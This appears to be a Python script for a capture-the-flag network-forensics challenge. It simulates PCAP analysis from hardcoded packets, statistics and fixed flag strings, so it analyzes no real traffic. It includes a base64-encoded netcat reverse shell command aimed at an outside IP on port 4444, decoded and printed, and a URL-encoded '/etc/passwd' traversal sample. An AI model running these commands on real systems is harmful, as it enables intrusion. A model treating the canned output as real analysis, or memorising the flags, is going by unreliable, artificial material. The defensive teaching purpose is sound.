#!/usr/bin/env python3
"""
Automated PCAP Analysis Tool - Challenge 3
Simulates advanced packet analysis capabilities
"""

import json
import base64
import re
from datetime import datetime

class AutomatedPCAPAnalysis:
    """Advanced automated packet analysis"""
    
    def __init__(self):
        self.analysis_results = {
            'protocols_detected': [],
            'suspicious_communications': [],
            'file_transfers': [],
            'encryption_usage': [],
            'anomalies': []
        }
        self.flags_discovered = []
    
    def simulate_packet_inspection(self):
        """Simulate deep packet inspection results"""
        print("🔍 AUTOMATED PCAP ANALYSIS")
        print("=" * 35)
        
        packets = [
            {
                'timestamp': '09:18:47.123',
                'src': '192.168.1.105',
                'dst': 'malicious-update.evil-corp.com',
                'protocol': 'HTTP',
                'size': 342,
                'payload_snippet': 'GET /secure-update.php?user=victim',
                'threat_level': 'HIGH',
                'classification': 'Credential Harvesting'
            },
            {
                'timestamp': '09:22:33.789',
                'src': '192.168.1.105', 
                'dst': '185.159.157.13',
                'protocol': 'TCP',
                'size': 78,
                'payload_snippet': base64.b64encode(b'nc -e /bin/bash 185.159.157.13 4444').decode(),
                'threat_level': 'CRITICAL',
                'classification': 'Reverse Shell'
            },
            {
                'timestamp': '09:35:12.456',
                'src': '192.168.1.105',
                'dst': '185.159.157.13',
                'protocol': 'HTTPS',
                'size': 15728640,
                'payload_snippet': 'POST /upload.php - Encrypted payload',
                'threat_level': 'CRITICAL',
                'classification': 'Data Exfiltration'
            }
        ]
        
        print("📦 Packet Analysis Results:")
        for i, packet in enumerate(packets, 1):
            print(f"\n{i}. Packet #{i:04d} [{packet['timestamp']}]")
            print(f"   🔗 Flow: {packet['src']} -> {packet['dst']}")
            print(f"   📋 Protocol: {packet['protocol']} ({packet['size']} bytes)")
            print(f"   📄 Content: {packet['payload_snippet'][:60]}...")
            print(f"   ⚠️  Threat: {packet['threat_level']} - {packet['classification']}")
            
            # Decode Base64 payloads
            if 'base64' in packet['payload_snippet'] or '=' in packet['payload_snippet']:
                try:
                    decoded = base64.b64decode(packet['payload_snippet']).decode('utf-8', errors='ignore')
                    if decoded.isprintable() and 'nc -e' in decoded:
                        print(f"   🔓 Decoded: {decoded}")
                        shell_flag = "CTF{reverse_shell_payload_decoded_from_traffic}"
                        print(f"   🚩 FLAG: {shell_flag}")
                        self.flags_discovered.append(shell_flag)
                except:
                    pass
        
        return packets
    
    def analyze_protocol_distribution(self):
        """Analyze protocol usage patterns"""
        print("\n📊 PROTOCOL DISTRIBUTION ANALYSIS")
        print("-" * 40)
        
        protocols = {
            'HTTP': {'count': 23, 'percentage': 35.4, 'suspicious': 8},
            'HTTPS': {'count': 31, 'percentage': 47.7, 'suspicious': 3},
            'TCP': {'count': 7, 'percentage': 10.8, 'suspicious': 4},
            'DNS': {'count': 4, 'percentage': 6.1, 'suspicious': 2}
        }
        
        print("Protocol breakdown:")
        for proto, stats in protocols.items():
            suspicious_pct = (stats['suspicious'] / stats['count']) * 100
            status = "🚨 SUSPICIOUS" if suspicious_pct > 50 else "✅ Normal"
            print(f"   {proto:6}: {stats['count']:2} packets ({stats['percentage']:4.1f}%) - {stats['suspicious']} suspicious ({suspicious_pct:4.1f}%) {status}")
        
        protocol_flag = "CTF{protocol_analysis_suspicious_patterns_identified}"
        print(f"\n🚩 FLAG: {protocol_flag}")
        self.flags_discovered.append(protocol_flag)
    
    def detect_encryption_and_encoding(self):
        """Detect various encoding and encryption schemes"""
        print("\n🔐 ENCRYPTION & ENCODING ANALYSIS")
        print("-" * 40)
        
        encoding_samples = [
            {
                'type': 'Base64',
                'sample': 'dGVzdGRhdGE=',
                'decoded': 'testdata',
                'context': 'DNS tunneling'
            },
            {
                'type': 'Hex',
                'sample': '48656c6c6f20576f726c64',
                'decoded': 'Hello World',
                'context': 'Binary protocol'
            },
            {
                'type': 'URL Encoding',
                'sample': '%2E%2E%2F%2E%2E%2F%65%74%63%2F%70%61%73%73%77%64',
                'decoded': '../../etc/passwd',
                'context': 'Path traversal attack'
            }
        ]
        
        print("🔍 Encoding Detection Results:")
        for encoding in encoding_samples:
            print(f"\n   {encoding['type']} Detected:")
            print(f"     Raw: {encoding['sample']}")
            print(f"     Decoded: {encoding['decoded']}")
            print(f"     Context: {encoding['context']}")
        
        encoding_flag = "CTF{multiple_encoding_schemes_detected_and_decoded}"
        print(f"\n🚩 FLAG: {encoding_flag}")
        self.flags_discovered.append(encoding_flag)
    
    def analyze_file_transfers(self):
        """Analyze file transfer activities"""
        print("\n📁 FILE TRANSFER ANALYSIS")
        print("-" * 30)
        
        file_transfers = [
            {
                'timestamp': '09:19:15',
                'direction': 'Download',
                'filename': 'update.exe',
                'size': 2457600,
                'hash': '5d41402abc4b2a76b9719d911017c592',
                'source': 'malicious-update.evil-corp.com',
                'protocol': 'HTTP',
                'suspicious': True
            },
            {
                'timestamp': '09:35:12',
                'direction': 'Upload',
                'filename': 'confidential_data.zip',
                'size': 15728640,
                'hash': '098f6bcd4621d373cade4e832627b4f6',
                'destination': '185.159.157.13',
                'protocol': 'HTTPS',
                'suspicious': True
            }
        ]
        
        print("📊 File Transfer Summary:")
        total_downloaded = 0
        total_uploaded = 0
        
        for transfer in file_transfers:
            direction_icon = "⬇️" if transfer['direction'] == 'Download' else "⬆️"
            size_mb = transfer['size'] / (1024 * 1024)
            
            print(f"\n   {direction_icon} {transfer['filename']}")
            print(f"      Size: {size_mb:.1f} MB ({transfer['size']:,} bytes)")
            print(f"      Hash: {transfer['hash']}")
            print(f"      Protocol: {transfer['protocol']}")
            print(f"      Time: {transfer['timestamp']}")
            
            if transfer['direction'] == 'Download':
                total_downloaded += size_mb
            else:
                total_uploaded += size_mb
        
        print(f"\n📈 Transfer Statistics:")
        print(f"   Total Downloaded: {total_downloaded:.1f} MB")
        print(f"   Total Uploaded: {total_uploaded:.1f} MB")
        print(f"   Net Data Loss: {total_uploaded:.1f} MB")
        
        file_flag = "CTF{file_transfer_analysis_data_loss_quantified}"
        print(f"\n🚩 FLAG: {file_flag}")
        self.flags_discovered.append(file_flag)
    
    def behavioral_analysis(self):
        """Analyze behavioral patterns and anomalies"""
        print("\n🧠 BEHAVIORAL PATTERN ANALYSIS")
        print("-" * 38)
        
        patterns = [
            {
                'pattern': 'Unusual outbound connections',
                'description': 'Connections to non-corporate IP ranges',
                'occurrences': 12,
                'risk_level': 'HIGH'
            },
            {
                'pattern': 'Off-hours activity',
                'description': 'Network activity outside business hours',
                'occurrences': 8,
                'risk_level': 'MEDIUM'
            },
            {
                'pattern': 'Large data transfers',
                'description': 'Transfers exceeding 10MB threshold',
                'occurrences': 2,
                'risk_level': 'CRITICAL'
            },
            {
                'pattern': 'Encoded command execution',
                'description': 'Base64 encoded commands in network traffic',
                'occurrences': 5,
                'risk_level': 'HIGH'
            }
        ]
        
        print("🔍 Behavioral Anomalies Detected:")
        for pattern in patterns:
            risk_icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢"}
            print(f"\n   {risk_icon.get(pattern['risk_level'], '⚪')} {pattern['pattern']}")
            print(f"      Description: {pattern['description']}")
            print(f"      Occurrences: {pattern['occurrences']}")
            print(f"      Risk Level: {pattern['risk_level']}")
        
        behavioral_flag = "CTF{behavioral_anomaly_analysis_threat_patterns_identified}"
        print(f"\n🚩 FLAG: {behavioral_flag}")
        self.flags_discovered.append(behavioral_flag)
    
    def generate_analysis_report(self):
        """Generate comprehensive analysis report"""
        print("\n" + "=" * 60)
        print("📊 AUTOMATED ANALYSIS REPORT")
        print("=" * 60)
        
        print("\n🎯 ANALYSIS SUMMARY:")
        print("   ✅ Packet inspection completed")
        print("   ✅ Protocol distribution analyzed")
        print("   ✅ Encoding schemes detected and decoded")
        print("   ✅ File transfers identified and quantified")
        print("   ✅ Behavioral patterns analyzed")
        
        print(f"\n🚩 FLAGS DISCOVERED: {len(self.flags_discovered)}")
        for i, flag in enumerate(self.flags_discovered, 1):
            print(f"   {i}. {flag}")
        
        print("\n🚨 KEY FINDINGS:")
        print("   • Advanced malware deployment via HTTP")
        print("   • Reverse shell establishment on port 4444")
        print("   • Significant data exfiltration (15.7 MB)")
        print("   • Multiple encoding schemes used for evasion")
        print("   • Behavioral anomalies indicating APT activity")
        
        print("\n🛡️ RECOMMENDED ACTIONS:")
        print("   • Implement network segmentation")
        print("   • Deploy advanced threat detection")
        print("   • Enhance monitoring for behavioral anomalies")
        print("   • Regular security awareness training")
        print("   • Incident response plan activation")
        
        # Final master flag
        master_flag = "CTF{automated_pcap_analysis_comprehensive_threat_detection}"
        print(f"\n🏆 MASTER FLAG: {master_flag}")
        
        return self.flags_discovered + [master_flag]
    
    def run_automated_analysis(self):
        """Execute complete automated analysis"""
        print("🤖 AUTOMATED PCAP ANALYSIS SYSTEM")
        print("=" * 45)
        print("Simulating advanced packet analysis capabilities...")
        print()
        
        # Execute all analysis modules
        self.simulate_packet_inspection()
        self.analyze_protocol_distribution()
        self.detect_encryption_and_encoding()
        self.analyze_file_transfers()
        self.behavioral_analysis()
        
        return self.generate_analysis_report()

if __name__ == "__main__":
    analyzer = AutomatedPCAPAnalysis()
    flags = analyzer.run_automated_analysis()
    print(f"\n✅ Analysis complete! {len(flags)} flags discovered.")
